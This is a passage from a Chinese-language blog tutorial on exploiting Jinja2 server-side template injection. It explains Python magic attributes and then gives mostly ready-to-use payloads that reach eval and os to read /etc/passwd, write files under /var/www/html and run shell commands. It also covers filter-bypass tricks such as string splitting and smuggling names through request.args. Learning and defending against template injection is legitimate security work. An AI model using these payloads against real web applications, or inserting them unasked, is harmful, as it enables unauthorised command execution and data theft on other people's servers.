title="四、漏洞利用"></a>四、漏洞利用</h1><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等</p><table><thead><tr><th>魔术方法</th><th>说明</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>保存类实例或对象实例的属性变量键值对字典</td></tr><tr><td><code>__class__</code></td><td>返回调用的参数类型</td></tr><tr><td><code>__mro__</code></td><td>返回一个包含对象所继承的基类元素，方法在解析时按照元组的顺序解析</td></tr><tr><td><code>__base__</code></td><td>返回该对象所继承的基类</td></tr><tr><td><code>__subclasses__</code></td><td>返回object的子类</td></tr><tr><td><code>__init__</code></td><td>类的初始化方法</td></tr><tr><td><code>__globals__</code></td><td>函数会以字典类型放回当前位置的全部全局变量与func_globals等价</td></tr><tr><td><code>__bases__</code></td><td>返回该对象所继承的类型列表</td></tr></tbody></table><h2 id="1、基本步骤"><a href="#1、基本步骤" class="headerlink" title="1、基本步骤"></a>1、基本步骤</h2><p>###1.基础利用</p><p>使用魔术方法进行函数解析，获取基本类</p><pre class="line-numbers language-none"><code class="language-none">''.__class__.__mro__[2]{}.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>获取基本类后，继续获取基本类的object的子类</p><pre class="line-numbers language-none"><code class="language-none">object.__subclasses__()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可能子类中含有可以利用的函数，例如eval等</p><p>也可以利用模板控制语句</p><p>例如这样：</p><pre class="line-numbers language-none"><code class="language-none">{%for c in ''.__class__.__base__.__subclasses__()%}{% if 'os' in c.__init__.__globals__%}{{loop.index0 ~'_'~c.__name__~'-'}}{% else %}{{ '-' }}{%endif%}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-利用内置模块执行命令"><a href="#2-利用内置模块执行命令" class="headerlink" title="2.利用内置模块执行命令"></a>2.利用内置模块执行命令</h3><p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p><p>利用控制语句找到可用的模块，或者builtins</p><pre class="line-numbers language-none"><code class="language-none">{% for c in ''.__class__.__base__.__subclasses__() %}{% if '__builtins__' in c.__init__.__globals__%}{{loop.index0 ~'_'~c.__name__~'-'}}{% else %}{{ '-' }}{%endif%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">{{''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-一些常用的payload"><a href="#2-一些常用的payload" class="headerlink" title="2.一些常用的payload"></a>2.一些常用的payload</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span>获取基本类<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token builtin">object</span><span class="token operator">//</span>读文件<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">r'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">object</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">r'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>写文件<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token builtin">object</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token operator">//</span>执行任意命令<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span><span class="token builtin">object</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查找命令</p><pre class="line-numbers language-none"><code class="language-none">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("id").read()') }}         //poppen的参数就是要执行的命令    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3.命令执行"></a>3.命令执行</h2><h3 id="1、os-system"><a href="#1、os-system" class="headerlink" title="1、os.system()"></a>1、os.system()</h3><p>用法：os.system(command)<br>但是用这个无法回显</p><h3 id="2、os-popen"><a href="#2、os-popen" class="headerlink" title="2、os.popen()"></a>2、os.popen()</h3><p>用法：os.popen(command[,mode[,bufsize]])</p><p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。<br>还需要了解一个魔法函数<br>globals该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls ").read()'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、Bypass"><a href="#4、Bypass" class="headerlink" title="4、Bypass"></a>4、Bypass</h2><p>如果遇到了过滤的情况，可以利用一下方式</p><h4 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1.拼接"></a>1.拼接</h4><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>####2.过滤””[]</p><p>例子：</p><p>借助request对象：<br>request变量可以访问所有已发送的参数，因此我们可以request.args.param用来检索新的paramGET参数的值,将其中的request.args改为request.values则利用post的方式进行传参</p><pre class="line-numbers language-none"><code class="language-none">{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>####3.过滤双下划线__</p><p>还是request方法</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()}}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="4-过滤一些函数名如-import-等"><a href="#4-过滤一些函数名如-import-等" class="headerlink" title="4.过滤一些函数名如__import__等"></a>4.过滤一些函数名如__import__等</h4><p>例子：</p><p>python的初始模块_builtin__里有很多危险的方法，一条路没了就找找其他的路<br>我们可以直接用 eval() exec() execfile()等</p><pre class="line-numbers language-none"><code class="language-none">__builtins__.eval()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="无、参考文章"><a href="#无、参考文章" class="headerlink" title="无、参考文章"></a>无、参考文章</h1><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html#gallery-1">https://www.cnblogs.com/Xy--1/p/12841941.html#gallery-1</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
